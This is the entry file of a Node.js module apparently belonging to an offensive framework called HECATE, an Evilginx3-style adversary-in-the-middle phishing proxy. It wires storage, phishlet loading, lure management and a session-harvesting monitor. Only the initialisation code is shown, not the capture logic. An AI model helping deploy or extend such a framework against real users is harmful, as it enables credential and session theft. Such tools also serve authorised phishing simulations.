'use strict';

/**
 * HECATE — Evil Proxy Module
 * Evilginx3-model adversary-in-the-middle reverse proxy.
 * Call init(deps) after core DB is ready.
 *
 * Required deps:
 *   deps.db           — node:sqlite Database instance
 *   deps.KeyManager   — core/crypto/key-manager (for at-rest encryption)
 *   deps.eventBus     — core/events/event-bus
 *   deps.Evidence     — core/db/models/evidence (optional — for core integration)
 *
 * The proxy server itself (HTTPS listener) is started separately via
 * startProxyServer(opts) — separate port from the API server (default 7443).
 */

const epStore        = require('./storage/evil-proxy-store');
const phishletStore  = require('./phishlet/store');
const phishletLoader = require('./phishlet/loader');
const sessionMonitor = require('./harvest/session-monitor');
const routes         = require('./api/routes');

let _initialised = false;

function init(deps = {}) {
  if (_initialised) return;
  const { db, KeyManager, eventBus, phishletDir } = deps;

  if (!db)         throw new Error('Evil proxy module requires deps.db');
  if (!KeyManager) throw new Error('Evil proxy module requires deps.KeyManager');

  // Init storage
  epStore.init(db, KeyManager);

  // Wire event bus to session monitor
  if (eventBus) sessionMonitor.setEventBus(eventBus);

  // Set phishlet directory if provided
  if (phishletDir) phishletLoader.setPhishletDir(phishletDir);

  // Start session cleanup timer
  sessionMonitor.startCleanup();

  _initialised = true;
}

function shutdown() {
  sessionMonitor.stopCleanup();
}

module.exports = {
  init,
  shutdown,
  routes,                               // Express Router — mount at /api/v1/evil-proxy
  addLure:    phishletStore.addLure,
  removeLure: phishletStore.removeLure,
  listLures:  phishletStore.listLures,
  listPhishlets: phishletLoader.list,
};
